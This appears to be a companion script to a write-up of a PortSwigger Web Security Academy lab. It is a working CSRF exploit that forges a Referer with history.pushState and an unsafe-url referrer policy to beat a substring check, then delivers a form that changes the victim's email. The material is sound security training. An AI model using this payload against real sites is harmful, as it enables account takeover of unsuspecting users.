#!/usr/bin/env python3
"""
CSRF with broken Referer validation
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 12-referer-validation-broken.md

What this does:
    A Referer header is required here (the previous lab's suppression trick
    is rejected), but the server checks whether the target's domain appears
    anywhere in the Referer value rather than parsing the URL and comparing
    its actual origin. craft_csrf_payload()'s contains-bypass strategy uses
    history.pushState() to rewrite the page's own URL to include the target
    domain as a query string without triggering a real navigation, then
    submits the form -- paired with a Referrer-Policy: unsafe-url response
    header on the exploit server, since more conservative default policies
    would otherwise strip the query string before the Referer is sent. The
    resulting Referer (https://EXPLOIT-SERVER/?TARGET-DOMAIN) satisfies a
    naive substring check while the request's actual origin stays the
    attacker's exploit server.

Usage:
    python 12-referer-validation-broken.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import urllib.parse
import httpx


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found.")
        return

    target_domain = urllib.parse.urlparse(lab_url).netloc
    endpoint = f"{lab_url}/my-account/change-email"
    html = (
        '<html>\n<body>\n'
        f'<form action="{endpoint}" method="POST">\n'
        '  <input type="hidden" name="email" value="hacker@evil-user.net" />\n'
        '</form>\n'
        '<script>\n'
        f'  history.pushState("", "", "/?{target_domain}");\n'
        '  document.forms[0].submit();\n'
        '</script>\n'
        '</body></html>'
    )
    headers = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=utf-8\r\n"
        "Referrer-Policy: unsafe-url"
    )
    print("[*] Technique: Referer contains-bypass via history.pushState + unsafe-url")
    print(f"[*] Forged Referer will read: https://<exploit-server>/?{target_domain}")

    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(5)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- the substring Referer check accepted the forged query string.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
